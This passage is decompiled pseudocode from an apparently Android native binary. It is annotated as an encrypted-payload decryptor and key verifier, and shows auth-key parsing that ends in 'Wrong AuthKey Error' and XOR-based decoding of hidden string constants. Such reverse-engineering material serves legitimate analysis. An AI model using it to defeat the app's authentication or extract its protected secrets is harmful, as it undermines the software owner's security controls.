          if (uVar46 < 8) goto LAB_001b9624;
          if (0x1f < uVar46) {
            uVar56 = uVar46 & 0xffffffffffffffe0;
            pbVar61 = pbVar5 + 0x10;
            uVar59 = uVar56;
            do {
              bVar64 = pbVar61[-0x10];
              bVar6 = pbVar61[-0xf];
              bVar16 = pbVar61[-0xe];
              bVar17 = pbVar61[-0xd];
              bVar18 = pbVar61[-0xc];
              bVar19 = pbVar61[-0xb];
              bVar20 = pbVar61[-10];
              bVar21 = pbVar61[-9];
              bVar22 = pbVar61[-8];
              bVar23 = pbVar61[-7];
              bVar24 = pbVar61[-6];
              bVar25 = pbVar61[-5];
              bVar26 = pbVar61[-4];
              bVar27 = pbVar61[-3];
              bVar28 = pbVar61[-2];
              bVar29 = pbVar61[-1];
              bVar30 = *pbVar61;
              bVar31 = pbVar61[1];
              bVar32 = pbVar61[2];
              bVar33 = pbVar61[3];
              bVar34 = pbVar61[4];
              bVar35 = pbVar61[5];
              bVar36 = pbVar61[6];
              bVar37 = pbVar61[7];
              bVar38 = pbVar61[8];
              bVar39 = pbVar61[9];
              bVar40 = pbVar61[10];
              bVar41 = pbVar61[0xb];
              bVar42 = pbVar61[0xc];
              bVar43 = pbVar61[0xd];
              bVar44 = pbVar61[0xe];
              bVar45 = pbVar61[0xf];
              uVar59 = uVar59 - 0x20;
              uVar10 = (uint6)CONCAT14(-(bVar27 - 0x61 < 0x1a),
                                       -(uint)((CONCAT12(bVar27,(ushort)bVar26) & 0xffff) - 0x61 <
                                              0x1a)) & 0xffff0000ffff;
              uVar8 = (uint6)CONCAT14(-(bVar19 - 0x61 < 0x1a),
                                      -(uint)((CONCAT12(bVar19,(ushort)bVar18) & 0xffff) - 0x61 <
                                             0x1a)) & 0xffff0000ffff;
              uVar12 = (uint6)CONCAT14(-(bVar43 - 0x61 < 0x1a),
                                       -(uint)((CONCAT12(bVar43,(ushort)bVar42) & 0xffff) - 0x61 <
                                              0x1a)) & 0xffff0000ffff;
              uVar14 = (uint6)CONCAT14(-(bVar35 - 0x61 < 0x1a),
                                       -(uint)((CONCAT12(bVar35,(ushort)bVar34) & 0xffff) - 0x61 <
                                              0x1a)) & 0xffff0000ffff;
              uVar11 = CONCAT12(-(bVar23 - 0x61 < 0x1a),-(ushort)(bVar22 - 0x61 < 0x1a)) & 0xff00ff;
              uVar9 = CONCAT12(-(bVar6 - 0x61 < 0x1a),-(ushort)(bVar64 - 0x61 < 0x1a)) & 0xff00ff;
              uVar13 = CONCAT12(-(bVar39 - 0x61 < 0x1a),-(ushort)(bVar38 - 0x61 < 0x1a)) & 0xff00ff;
              uVar15 = CONCAT12(-(bVar31 - 0x61 < 0x1a),-(ushort)(bVar30 - 0x61 < 0x1a)) & 0xff00ff;
              pbVar61[-8] = bVar22 ^ (bVar22 ^ bVar22 ^ 0x20) & (byte)uVar11;
              pbVar61[-7] = bVar23 ^ (bVar23 ^ bVar23 ^ 0x20) & (byte)(uVar11 >> 0x10);
              pbVar61[-6] = bVar24 ^ (bVar24 ^ bVar24 ^ 0x20) & -(bVar24 - 0x61 < 0x1a);
              pbVar61[-5] = bVar25 ^ (bVar25 ^ bVar25 ^ 0x20) & -(bVar25 - 0x61 < 0x1a);
              pbVar61[-4] = bVar26 ^ (bVar26 ^ bVar26 ^ 0x20) & (byte)uVar10;
              pbVar61[-3] = bVar27 ^ (bVar27 ^ bVar27 ^ 0x20) & (byte)(uVar10 >> 0x20);
              pbVar61[-2] = bVar28 ^ (bVar28 ^ bVar28 ^ 0x20) & -(bVar28 - 0x61 < 0x1a);
              pbVar61[-1] = bVar29 ^ (bVar29 ^ bVar29 ^ 0x20) & -(bVar29 - 0x61 < 0x1a);
              pbVar61[-0x10] = bVar64 ^ (bVar64 ^ bVar64 ^ 0x20) & (byte)uVar9;
              pbVar61[-0xf] = bVar6 ^ (bVar6 ^ bVar6 ^ 0x20) & (byte)(uVar9 >> 0x10);
              pbVar61[-0xe] = bVar16 ^ (bVar16 ^ bVar16 ^ 0x20) & -(bVar16 - 0x61 < 0x1a);
              pbVar61[-0xd] = bVar17 ^ (bVar17 ^ bVar17 ^ 0x20) & -(bVar17 - 0x61 < 0x1a);
              pbVar61[-0xc] = bVar18 ^ (bVar18 ^ bVar18 ^ 0x20) & (byte)uVar8;
              pbVar61[-0xb] = bVar19 ^ (bVar19 ^ bVar19 ^ 0x20) & (byte)(uVar8 >> 0x20);
              pbVar61[-10] = bVar20 ^ (bVar20 ^ bVar20 ^ 0x20) & -(bVar20 - 0x61 < 0x1a);
              pbVar61[-9] = bVar21 ^ (bVar21 ^ bVar21 ^ 0x20) & -(bVar21 - 0x61 < 0x1a);
              pbVar61[8] = bVar38 ^ (bVar38 ^ bVar38 ^ 0x20) & (byte)uVar13;
              pbVar61[9] = bVar39 ^ (bVar39 ^ bVar39 ^ 0x20) & (byte)(uVar13 >> 0x10);
              pbVar61[10] = bVar40 ^ (bVar40 ^ bVar40 ^ 0x20) & -(bVar40 - 0x61 < 0x1a);
              pbVar61[0xb] = bVar41 ^ (bVar41 ^ bVar41 ^ 0x20) & -(bVar41 - 0x61 < 0x1a);
              pbVar61[0xc] = bVar42 ^ (bVar42 ^ bVar42 ^ 0x20) & (byte)uVar12;
              pbVar61[0xd] = bVar43 ^ (bVar43 ^ bVar43 ^ 0x20) & (byte)(uVar12 >> 0x20);
              pbVar61[0xe] = bVar44 ^ (bVar44 ^ bVar44 ^ 0x20) & -(bVar44 - 0x61 < 0x1a);
              pbVar61[0xf] = bVar45 ^ (bVar45 ^ bVar45 ^ 0x20) & -(bVar45 - 0x61 < 0x1a);
              *pbVar61 = bVar30 ^ (bVar30 ^ bVar30 ^ 0x20) & (byte)uVar15;
              pbVar61[1] = bVar31 ^ (bVar31 ^ bVar31 ^ 0x20) & (byte)(uVar15 >> 0x10);
              pbVar61[2] = bVar32 ^ (bVar32 ^ bVar32 ^ 0x20) & -(bVar32 - 0x61 < 0x1a);
              pbVar61[3] = bVar33 ^ (bVar33 ^ bVar33 ^ 0x20) & -(bVar33 - 0x61 < 0x1a);
              pbVar61[4] = bVar34 ^ (bVar34 ^ bVar34 ^ 0x20) & (byte)uVar14;
              pbVar61[5] = bVar35 ^ (bVar35 ^ bVar35 ^ 0x20) & (byte)(uVar14 >> 0x20);
              pbVar61[6] = bVar36 ^ (bVar36 ^ bVar36 ^ 0x20) & -(bVar36 - 0x61 < 0x1a);
              pbVar61[7] = bVar37 ^ (bVar37 ^ bVar37 ^ 0x20) & -(bVar37 - 0x61 < 0x1a);
              pbVar61 = pbVar61 + 0x20;
            } while (uVar59 != 0);
            if (uVar46 != uVar56) {
              if ((uVar46 & 0x18) == 0) {
                pbVar61 = pbVar5 + uVar56;
              }
              else {
LAB_001b95c4:
                uVar59 = uVar46 & 0xfffffffffffffff8;
                pbVar61 = pbVar5 + uVar59;
                lVar60 = uVar56 - uVar59;
                puVar63 = (ulong *)(pbVar5 + uVar56);
                do {
                  uVar56 = *puVar63;
                  lVar60 = lVar60 + 8;
                  bVar64 = (byte)(uVar56 >> 8);
                  uVar8 = (uint6)CONCAT14(-((byte)(uVar56 >> 0x28) - 0x61 < 0x1a),
                                          -(uint)((byte)(uVar56 >> 0x20) - 0x61 < 0x1a)) &
                          0xffff0000ffff;
                  *puVar63 = uVar56 ^ (uVar56 ^ uVar56 ^ 0x2020202020202020) &
                                      CONCAT17(-((byte)(uVar56 >> 0x38) - 0x61 < 0x1a),
                                               CONCAT16(-((byte)(uVar56 >> 0x30) - 0x61 < 0x1a),
                                                        CONCAT15((char)(uVar8 >> 0x20),
                                                                 CONCAT14((char)uVar8,
                                                                          CONCAT13(-((byte)(uVar56 
                                                  >> 0x18) - 0x61 < 0x1a),
                                                  CONCAT12(-((byte)(uVar56 >> 0x10) - 0x61 < 0x1a),
                                                           CONCAT11(-(bVar64 - 0x61 < 0x1a),
                                                                    -((CONCAT12(bVar64,(ushort)(byte
                                                  )uVar56) & 0xffff) - 0x61 < 0x1a))))))));
                  puVar63 = puVar63 + 1;
                } while (lVar60 != 0);
                if (uVar46 == uVar59) goto LAB_001b9648;
              }
LAB_001b9624:
              do {
                bVar6 = *pbVar61;
                bVar64 = bVar6 ^ 0x20;
                if (0x19 < bVar6 - 0x61) {
                  bVar64 = bVar6;
                }
                pbVar62 = pbVar61 + 1;
                *pbVar61 = bVar64;
                pbVar61 = pbVar62;
              } while (pbVar62 != pbVar5 + uVar46);
            }
LAB_001b9648:
            bVar64 = *(byte *)(param_2 + 0x378);
            uVar59 = *(ulong *)(param_2 + 0x380);
            uVar56 = (ulong)(bVar64 >> 1);
LAB_001b9658:
            if ((bVar64 & 1) != 0) {
              uVar56 = uVar59;
            }
            while (uVar56 < 0x40) {
              FUN_00207348(&local_10d0,&DAT_0013edd5,puVar2);
              if ((*(byte *)puVar2 & 1) != 0) {
                free(*(void **)(param_2 + 0x388));
              }
              *(ulong *)(param_2 + 0x380) = uStack_10c8;
              *puVar2 = local_10d0;
              *(void **)(param_2 + 0x388) = local_10c0;
              uVar56 = (ulong)(*(byte *)(param_2 + 0x378) >> 1);
              if ((*(byte *)(param_2 + 0x378) & 1) != 0) {
                uVar56 = *(ulong *)(param_2 + 0x380);
              }
            }
            uStack_10c8 = 0;
            local_10d0 = 0;
            local_10c0 = (void *)0x0;
            uStack_10e8 = 0;
            local_10f0 = 0;
            local_10e0 = (void *)0x0;
            uStack_1108 = 0;
            local_1110 = 0;
            local_1100 = (void *)0x0;
            FUN_002043ac(&local_1130,puVar2,0,0x40,puVar2);
            if ((local_10d0 & 1) != 0) {
              free(local_10c0);
            }
            uStack_10c8 = uStack_1128;
            local_10d0 = local_1130;
            local_10c0 = local_1120;
            FUN_002043ac(&local_1130,puVar2,0,0x20,puVar2);
            if ((local_10f0 & 1) != 0) {
              free(local_10e0);
            }
            uStack_10e8 = uStack_1128;
            local_10f0 = local_1130;
            local_10e0 = local_1120;
            FUN_002036bc(local_13b0,&local_10d0);
            FUN_002036bc(local_13c8,&local_10f0);
            uVar48 = FUN_002036bc(local_13e0,puVar47);
            FUN_001b874c(uVar48,local_13b0,local_13c8,local_13e0,&local_1110);
            if ((local_13e0[0] & 1) != 0) {
              free(local_13d0);
            }
            if ((local_13c8[0] & 1) != 0) {
              free(local_13b8);
            }
            if ((local_13b0[0] & 1) != 0) {
              free(local_13a0);
            }
            FUN_00204f8c(puVar47,&local_1110);
            uVar48 = FUN_002036bc(local_13f8,puVar47);
            FUN_001b8524(uVar48,local_13f8,puVar47);
            if ((local_13f8[0] & 1) != 0) {
              free(local_13e8);
            }
            sVar54 = (ulong)(*(byte *)(param_2 + 0x390) >> 1);
            pcVar52 = pcVar1;
            if ((*(byte *)(param_2 + 0x390) & 1) != 0) {
              sVar54 = *(size_t *)(param_2 + 0x398);
              pcVar52 = *(char **)(param_2 + 0x3a0);
            }
            pcVar53 = pcVar52 + sVar54;
            pcVar50 = pcVar52;
            while (((pcVar51 = pcVar53, 0 < (long)sVar54 &&
                    (pcVar50 = memchr(pcVar50,0x3b,sVar54), pcVar50 != (char *)0x0)) &&
                   (pcVar51 = pcVar50, *pcVar50 != ';'))) {
              pcVar50 = pcVar50 + 1;
              sVar54 = (long)pcVar53 - (long)pcVar50;
            }
            lVar60 = (long)((int)pcVar51 - (int)pcVar52);
            if (pcVar51 == pcVar53) {
              lVar60 = -1;
            }
            FUN_002043ac(&local_1130,puVar47,0,lVar60,puVar47);
            if ((*param_1 & 1) != 0) {
              free((void *)param_1[2]);
            }
            param_1[1] = uStack_1128;
            *param_1 = local_1130;
            param_1[2] = (ulong)local_1120;
            FUN_00204950(puVar47,0,lVar60 + 1);
            sVar54 = (ulong)(*(byte *)(param_2 + 0x390) >> 1);
            pcVar52 = pcVar1;
            if ((*(byte *)(param_2 + 0x390) & 1) != 0) {
              sVar54 = *(size_t *)(param_2 + 0x398);
              pcVar52 = *(char **)(param_2 + 0x3a0);
            }
            pcVar53 = pcVar52 + sVar54;
            pcVar50 = pcVar52;
            while (((pcVar51 = pcVar53, 0 < (long)sVar54 &&
                    (pcVar50 = memchr(pcVar50,0x3b,sVar54), pcVar50 != (char *)0x0)) &&
                   (pcVar51 = pcVar50, *pcVar50 != ';'))) {
              pcVar50 = pcVar50 + 1;
              sVar54 = (long)pcVar53 - (long)pcVar50;
            }
            lVar60 = (long)((int)pcVar51 - (int)pcVar52);
            if (pcVar51 == pcVar53) {
              lVar60 = -1;
            }
            FUN_002043ac(&local_1130,puVar47,0,lVar60,puVar47);
            if ((param_1[3] & 1) != 0) {
              free((void *)param_1[5]);
            }
            param_1[4] = uStack_1128;
            param_1[3] = local_1130;
            param_1[5] = (ulong)local_1120;
            FUN_00204950(puVar47,0,lVar60 + 1);
            sVar54 = (ulong)(*(byte *)(param_2 + 0x390) >> 1);
            pcVar52 = pcVar1;
            if ((*(byte *)(param_2 + 0x390) & 1) != 0) {
              sVar54 = *(size_t *)(param_2 + 0x398);
              pcVar52 = *(char **)(param_2 + 0x3a0);
            }
            pcVar53 = pcVar52 + sVar54;
            pcVar50 = pcVar52;
            while (((pcVar51 = pcVar53, 0 < (long)sVar54 &&
                    (pcVar50 = memchr(pcVar50,0x3b,sVar54), pcVar50 != (char *)0x0)) &&
                   (pcVar51 = pcVar50, *pcVar50 != ';'))) {
              pcVar50 = pcVar50 + 1;
              sVar54 = (long)pcVar53 - (long)pcVar50;
            }
            lVar60 = (long)((int)pcVar51 - (int)pcVar52);
            if (pcVar51 == pcVar53) {
              lVar60 = -1;
            }
            FUN_002043ac(&local_1130,puVar47,0,lVar60,puVar47);
            if ((param_1[6] & 1) != 0) {
              free((void *)param_1[8]);
            }
            param_1[7] = uStack_1128;
            param_1[6] = local_1130;
            param_1[8] = (ulong)local_1120;
            FUN_00204950(puVar47,0,lVar60 + 1);
            sVar54 = (ulong)(*(byte *)(param_2 + 0x390) >> 1);
            if ((*(byte *)(param_2 + 0x390) & 1) != 0) {
              sVar54 = *(size_t *)(param_2 + 0x398);
              pcVar1 = *(char **)(param_2 + 0x3a0);
            }
            pcVar50 = pcVar1 + sVar54;
            pcVar52 = pcVar1;
            while (((pcVar53 = pcVar50, 0 < (long)sVar54 &&
                    (pcVar52 = memchr(pcVar52,0x3b,sVar54), pcVar52 != (char *)0x0)) &&
                   (pcVar53 = pcVar52, *pcVar52 != ';'))) {
              pcVar52 = pcVar52 + 1;
              sVar54 = (long)pcVar50 - (long)pcVar52;
            }
            lVar60 = (long)((int)pcVar53 - (int)pcVar1);
            if (pcVar53 == pcVar50) {
              lVar60 = -1;
            }
            FUN_002043ac(&local_1130,puVar47,0,lVar60,puVar47);
            if ((param_1[9] & 1) != 0) {
              free((void *)param_1[0xb]);
            }
            param_1[10] = uStack_1128;
            param_1[9] = local_1130;
            param_1[0xb] = (ulong)local_1120;
            FUN_00204950(puVar47,0,lVar60 + 1);
            if ((local_1110 & 1) != 0) {
              free(local_1100);
            }
            if ((local_10f0 & 1) != 0) {
              free(local_10e0);
            }
            if ((local_10d0 & 1) != 0) {
              free(local_10c0);
            }
            if ((local_10b0 & 1) != 0) {
              free(local_10a0);
            }
            if ((local_1090 & 1) == 0) {
              if (*(long *)(lVar7 + 0x28) != local_68) {
LAB_001b9b90:
                    /* WARNING: Subroutine does not return */
                __stack_chk_fail();
              }
            }
            else {
              free(local_1080);
              if (*(long *)(lVar7 + 0x28) != local_68) goto LAB_001b9b90;
            }
            return;
          }
          uVar56 = 0;
          goto LAB_001b95c4;
        }
        break;
      }
      pcVar50 = (char *)((long)plVar49 + 1);
      uVar56 = (long)plVar3 - (long)pcVar50;
    } while (7 < (long)uVar56);
  }
  printf("\n\nWrong AuthKey Error");
                    /* WARNING: Subroutine does not return */
  exit(1);
}



// ----------------------------------------------------------------




/*
 * [PHONE FUNCTION] FUN_001b9b9c
 * Purpose (EN): Encrypted Payload Decryptor & Key Verification
 * Purpose (AR): فك تشفير مفتاح الجلسة والتحقق من التوقيع
 */

// Function: FUN_001b9b9c @ 001b9b9c
// ----------------------------------------------------------------

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_001b9b9c(undefined8 *param_1)

{
  char cVar1;
  long lVar2;
  undefined1 auVar3 [16];
  undefined1 auVar4 [16];
  undefined1 auVar5 [16];
  byte *pbVar6;
  long lVar7;
  long lVar8;
  undefined8 uVar9;
  void *pvVar10;
  undefined8 *puVar11;
  undefined4 *puVar12;
  undefined1 *puVar13;
  undefined8 *puVar14;
  undefined1 auVar15 [16];
  long lVar19;
  undefined1 auVar16 [16];
  undefined1 auVar17 [16];
  undefined1 auVar18 [16];
  long lVar22;
  undefined1 auVar20 [16];
  undefined1 auVar21 [16];
  long lVar26;
  undefined1 auVar23 [16];
  undefined1 auVar24 [16];
  undefined1 auVar25 [16];
  long lVar30;
  undefined1 auVar27 [16];
  undefined1 auVar28 [16];
  undefined1 auVar29 [16];
  long lVar34;
  undefined1 auVar31 [16];
  undefined1 auVar32 [16];
  undefined1 auVar33 [16];
  long lVar38;
  undefined1 auVar35 [16];
  undefined1 auVar36 [16];
  undefined1 auVar37 [16];
  long lVar42;
  undefined1 auVar39 [16];
  undefined1 auVar40 [16];
  undefined1 auVar41 [16];
  byte bVar43;
  byte bVar44;
  byte local_190 [16];
  void *local_180;
  byte local_178 [16];
  void *local_168;
  byte local_160 [16];
  void *local_150;
  undefined8 local_148;
  undefined8 uStack_140;
  undefined8 local_138;
  undefined8 uStack_130;
  undefined8 local_128;
  undefined8 uStack_120;
  undefined8 local_118;
  undefined8 uStack_110;
  undefined8 local_108;
  undefined8 uStack_100;
  undefined8 uStack_f8;
  undefined8 uStack_f0;
  undefined8 local_e8;
  undefined8 uStack_e0;
  undefined8 uStack_d8;
  undefined8 uStack_d0;
  undefined8 local_c8;
  undefined8 uStack_c0;
  undefined8 uStack_b8;
  undefined8 uStack_b0;
  undefined8 local_a8;
  undefined8 uStack_a0;
  undefined8 uStack_98;
  undefined8 uStack_90;
  undefined8 local_88;
  undefined8 uStack_80;
  undefined8 uStack_78;
  undefined8 uStack_70;
  undefined8 local_68;
  undefined8 uStack_60;
  undefined8 uStack_58;
  undefined8 uStack_50;
  long local_48;
  
  lVar2 = tpidr_el0;
  local_48 = *(long *)(lVar2 + 0x28);
  param_1[9] = 0;
  *param_1 = 0x400921fb54442d18;
  param_1[4] = 0;
  param_1[3] = 0;
  param_1[6] = 0;
  param_1[5] = 0;
  param_1[8] = 0;
  param_1[7] = 0;
  puVar14 = param_1 + 1;
  param_1[2] = 0;
  *puVar14 = 0;
  param_1[0x29] = param_1[0x29];
  param_1[0x49] = param_1[0x49];
  pbVar6 = (byte *)FUN_002295c4(&DAT_00236110);
  if ((*pbVar6 & 1) == 0) {
    pvVar10 = (void *)FUN_002295c4(&DAT_002360f0);
    *(undefined1 *)((long)pvVar10 + 0x201) = 1;
    memcpy(pvVar10,&DAT_00179712,0x201);
    FUN_002234c0(FUN_001bc850,pvVar10,0x2362d0);
    puVar13 = (undefined1 *)FUN_002295c4(&DAT_00236110);
    *puVar13 = 1;
    lVar7 = FUN_002295c4(&DAT_002360f0);
    cVar1 = *(char *)(lVar7 + 0x201);
    auVar18 = _DAT_00176f90;
    auVar29 = _DAT_00177010;
    auVar25 = ram0x00177090;
    auVar41 = _DAT_00177390;
    auVar37 = _DAT_00177550;
    auVar21 = _DAT_001775c0;
    auVar33 = _DAT_00177870;
  }
  else {
    lVar7 = FUN_002295c4(&DAT_002360f0);
    cVar1 = *(char *)(lVar7 + 0x201);
    auVar18 = _DAT_00176f90;
    auVar29 = _DAT_00177010;
    auVar25 = ram0x00177090;
    auVar41 = _DAT_00177390;
    auVar37 = _DAT_00177550;
    auVar21 = _DAT_001775c0;
    auVar33 = _DAT_00177870;
  }
  _DAT_00176f90 = auVar18;
  _DAT_00177010 = auVar29;
  unique0x1000203c = auVar25;
  _DAT_00177390 = auVar41;
  _DAT_00177550 = auVar37;
  _DAT_001775c0 = auVar21;
  _DAT_00177870 = auVar33;
  if (cVar1 != '\0') {
    lVar7 = 0;
    bVar44 = (byte)_UNK_00176bc8;
    bVar43 = (byte)_DAT_00176bc0;
    do {
      lVar38 = auVar37._8_8_;
      lVar34 = auVar33._8_8_;
      lVar26 = auVar25._8_8_;
      lVar19 = auVar18._8_8_;
      lVar42 = auVar41._8_8_;
      lVar30 = auVar29._8_8_;
      lVar22 = auVar21._8_8_;
      auVar5[8] = 0xdd;
      auVar5._0_8_ = 0x750729cbe569d1dd;
      auVar4[8] = 0xdd;
      auVar4._0_8_ = 0x750729cbe569d1dd;
      auVar3[8] = 0xdd;
      auVar3._0_8_ = 0x750729cbe569d1dd;
      auVar40[8] = 0xdd;
      auVar40._0_8_ = 0x750729cbe569d1dd;
      auVar28[8] = 0xdd;
      auVar28._0_8_ = 0x750729cbe569d1dd;
      auVar24[8] = 0xdd;
      auVar24._0_8_ = 0x750729cbe569d1dd;
      auVar17[8] = 0xdd;
      auVar17._0_8_ = 0x750729cbe569d1dd;
      auVar15[8] = 0xdd;
      auVar15._0_8_ = 0x750729cbe569d1dd;
      auVar20._0_8_ = -(ulong)((byte)(auVar21._0_8_ << 3) & 0x38);
      auVar20._8_8_ = -(ulong)((byte)(lVar22 << 3) & 0x38);
      auVar36._0_8_ = -(ulong)((byte)(auVar29._0_8_ << 3) & 0x38);
      auVar36._8_8_ = -(ulong)((byte)(lVar30 << 3) & 0x38);
      auVar16._0_8_ = -(ulong)((byte)(auVar18._0_8_ << 3) & 0x38);
      auVar16._8_8_ = -(ulong)((byte)(lVar19 << 3) & 0x38);
      auVar23._0_8_ = -(ulong)((byte)(auVar25._0_8_ << 3) & 0x38);
      auVar23._8_8_ = -(ulong)((byte)(lVar26 << 3) & 0x38);
      auVar35._0_8_ = -(ulong)((byte)(auVar37._0_8_ << 3) & 0x38);
      auVar35._8_8_ = -(ulong)((byte)(lVar38 << 3) & 0x38);
      auVar31._0_8_ = -(ulong)((byte)(auVar41._0_8_ << 3) & 0x38);
      auVar31._8_8_ = -(ulong)((byte)(lVar42 << 3) & 0x38);
      auVar27._0_8_ = -(ulong)(byte)((bVar43 & 7) << 3);
      auVar27._8_8_ = -(ulong)(byte)((bVar44 & 7) << 3);
      auVar39._0_8_ = -(ulong)((byte)(auVar33._0_8_ << 3) & 0x38);
      auVar39._8_8_ = -(ulong)((byte)(lVar34 << 3) & 0x38);
      auVar15[9] = 0xd1;
      auVar15[10] = 0x69;
      auVar15[0xb] = 0xe5;
      auVar15[0xc] = 0xcb;
      auVar15[0xd] = 0x29;
      auVar15[0xe] = 7;
      auVar15[0xf] = 0x75;
      auVar15 = NEON_ushl(auVar15,auVar20,8);
      auVar17[9] = 0xd1;
      auVar17[10] = 0x69;
      auVar17[0xb] = 0xe5;
      auVar17[0xc] = 0xcb;
      auVar17[0xd] = 0x29;
      auVar17[0xe] = 7;
      auVar17[0xf] = 0x75;
      auVar20 = NEON_ushl(auVar17,auVar36,8);
      auVar24[9] = 0xd1;
      auVar24[10] = 0x69;
      auVar24[0xb] = 0xe5;
      auVar24[0xc] = 0xcb;
      auVar24[0xd] = 0x29;
      auVar24[0xe] = 7;
      auVar24[0xf] = 0x75;
      auVar36 = NEON_ushl(auVar24,auVar35,8);
      auVar28[9] = 0xd1;
      auVar28[10] = 0x69;
      auVar28[0xb] = 0xe5;
      auVar28[0xc] = 0xcb;
      auVar28[0xd] = 0x29;
      auVar28[0xe] = 7;
      auVar28[0xf] = 0x75;
      auVar32 = NEON_ushl(auVar28,auVar31,8);
      auVar40[9] = 0xd1;
      auVar40[10] = 0x69;
      auVar40[0xb] = 0xe5;
      auVar40[0xc] = 0xcb;
      auVar40[0xd] = 0x29;
      auVar40[0xe] = 7;
      auVar40[0xf] = 0x75;
      auVar28 = NEON_ushl(auVar40,auVar27,8);
      auVar3[9] = 0xd1;
      auVar3[10] = 0x69;
      auVar3[0xb] = 0xe5;
      auVar3[0xc] = 0xcb;
      auVar3[0xd] = 0x29;
      auVar3[0xe] = 7;
      auVar3[0xf] = 0x75;
      auVar40 = NEON_ushl(auVar3,auVar39,8);
      auVar4[9] = 0xd1;
      auVar4[10] = 0x69;
      auVar4[0xb] = 0xe5;
      auVar4[0xc] = 0xcb;
      auVar4[0xd] = 0x29;
      auVar4[0xe] = 7;
      auVar4[0xf] = 0x75;
      auVar24 = NEON_ushl(auVar4,auVar23,8);
      auVar5[9] = 0xd1;
      auVar5[10] = 0x69;
      auVar5[0xb] = 0xe5;
      auVar5[0xc] = 0xcb;
      auVar5[0xd] = 0x29;
      auVar5[0xe] = 7;
      auVar5[0xf] = 0x75;
      auVar17 = NEON_ushl(auVar5,auVar16,8);
      lVar8 = FUN_002295c4(&DAT_002360f0);
      pbVar6 = (byte *)(lVar8 + lVar7);
      auVar32._0_8_ =
           CONCAT17(pbVar6[7] ^ auVar40[8],
                    CONCAT16(pbVar6[6] ^ auVar40[0],
                             CONCAT15(pbVar6[5] ^ auVar36[8],
                                      CONCAT14(pbVar6[4] ^ auVar36[0],
                                               CONCAT13(pbVar6[3] ^ auVar32[8],
                                                        CONCAT12(pbVar6[2] ^ auVar32[0],
                                                                 CONCAT11(pbVar6[1] ^ auVar28[8],
                                                                          *pbVar6 ^ auVar28[0]))))))
                   );
      auVar32[8] = pbVar6[8] ^ auVar20[0];
      auVar32[9] = pbVar6[9] ^ auVar20[8];
      auVar32[10] = pbVar6[10] ^ auVar24[0];
      auVar32[0xb] = pbVar6[0xb] ^ auVar24[8];
      auVar32[0xc] = pbVar6[0xc] ^ auVar15[0];
      auVar32[0xd] = pbVar6[0xd] ^ auVar15[8];
      auVar32[0xe] = pbVar6[0xe] ^ auVar17[0];
      auVar32[0xf] = pbVar6[0xf] ^ auVar17[8];
      auVar37._0_8_ = auVar37._0_8_ + 0x10;
      auVar37._8_8_ = lVar38 + 0x10;
      auVar41._0_8_ = auVar41._0_8_ + 0x10;
      auVar41._8_8_ = lVar42 + 0x10;
      bVar43 = bVar43 + 0x10;
      bVar44 = bVar44 + 0x10;
      ((undefined8 *)(lVar8 + lVar7))[1] = auVar32._8_8_;
      *(undefined8 *)(lVar8 + lVar7) = auVar32._0_8_;
      auVar33._0_8_ = auVar33._0_8_ + 0x10;
      auVar33._8_8_ = lVar34 + 0x10;
      lVar7 = lVar7 + 0x10;
      auVar29._0_8_ = auVar29._0_8_ + 0x10;
      auVar29._8_8_ = lVar30 + 0x10;
      auVar25._0_8_ = auVar25._0_8_ + 0x10;
      auVar25._8_8_ = lVar26 + 0x10;
      auVar21._0_8_ = auVar21._0_8_ + 0x10;
      auVar21._8_8_ = lVar22 + 0x10;
      auVar18._0_8_ = auVar18._0_8_ + 0x10;
      auVar18._8_8_ = lVar19 + 0x10;
    } while (lVar7 != 0x200);
    lVar7 = FUN_002295c4(&DAT_002360f0);
    *(undefined1 *)(lVar7 + 0x201) = 0;
    *(byte *)(lVar7 + 0x200) = *(byte *)(lVar7 + 0x200) ^ 0xdd;
  }
  uVar9 = FUN_002295c4(&DAT_002360f0);
  FUN_00204d38(puVar14,uVar9);
  pbVar6 = (byte *)FUN_002295c4(&DAT_00236150);
  if ((*pbVar6 & 1) == 0) {
    puVar11 = (undefined8 *)FUN_002295c4(&DAT_00236130);
    *puVar11 = DAT_00177938;
    FUN_002234c0(&LAB_001bc868,puVar11,0x2362d0);
    puVar13 = (undefined1 *)FUN_002295c4(&DAT_00236150);
    *puVar13 = 1;
    lVar7 = FUN_002295c4(&DAT_00236130);
    cVar1 = *(char *)(lVar7 + 7);
  }
  else {
    lVar7 = FUN_002295c4(&DAT_00236130);
    cVar1 = *(char *)(lVar7 + 7);
  }
  if (cVar1 != '\0') {
    pbVar6 = (byte *)FUN_002295c4(&DAT_00236130);
    pbVar6[7] = 0;
    *pbVar6 = *pbVar6 ^ 0x87;
    pbVar6[1] = pbVar6[1] ^ 199;
    pbVar6[2] = pbVar6[2] ^ 0xa3;
    pbVar6[5] = pbVar6[5] ^ 0xcd;
    pbVar6[3] = pbVar6[3] ^ 0x93;
    pbVar6[4] = pbVar6[4] ^ 0xa5;
    pbVar6[6] = pbVar6[6] ^ 0xab;
  }
  uVar9 = FUN_002295c4(&DAT_00236130);
  FUN_00204d38(param_1 + 4,uVar9);
  pbVar6 = (byte *)FUN_002295c4(&DAT_00236190);
  if ((*pbVar6 & 1) == 0) {
    puVar12 = (undefined4 *)FUN_002295c4(&DAT_00236170);
    *(undefined2 *)(puVar12 + 1) = 0x11f;
    *puVar12 = 0xb1b3c0e5;
    FUN_002234c0(&LAB_001bc874,puVar12,0x2362d0);
    puVar13 = (undefined1 *)FUN_002295c4(&DAT_00236190);
    *puVar13 = 1;
    lVar7 = FUN_002295c4(&DAT_00236170);
    cVar1 = *(char *)(lVar7 + 5);
  }
  else {
    lVar7 = FUN_002295c4(&DAT_00236170);
    cVar1 = *(char *)(lVar7 + 5);
  }
  if (cVar1 != '\0') {
    pbVar6 = (byte *)FUN_002295c4(&DAT_00236170);
    pbVar6[5] = 0;
    *pbVar6 = *pbVar6 ^ 0xd5;
    pbVar6[1] = pbVar6[1] ^ 0xf1;
    pbVar6[2] = pbVar6[2] ^ 0xf5;
    pbVar6[3] = pbVar6[3] ^ 0xf7;
    pbVar6[4] = pbVar6[4] ^ 0x1f;
  }
  uVar9 = FUN_002295c4(&DAT_00236170);
  FUN_00204d38(param_1 + 7,uVar9);
  FUN_002036bc(local_178,puVar14);
  FUN_001ba254(local_160,param_1,local_178);
  pvVar10 = (void *)((ulong)local_160 | 1);
  if ((local_160[0] & 1) != 0) {
    pvVar10 = local_150;
  }
  FUN_001bcae8(&local_148,pvVar10,0);
  if (param_1 + 10 != &local_148) {
    param_1[0x23] = uStack_80;
    param_1[0x22] = local_88;
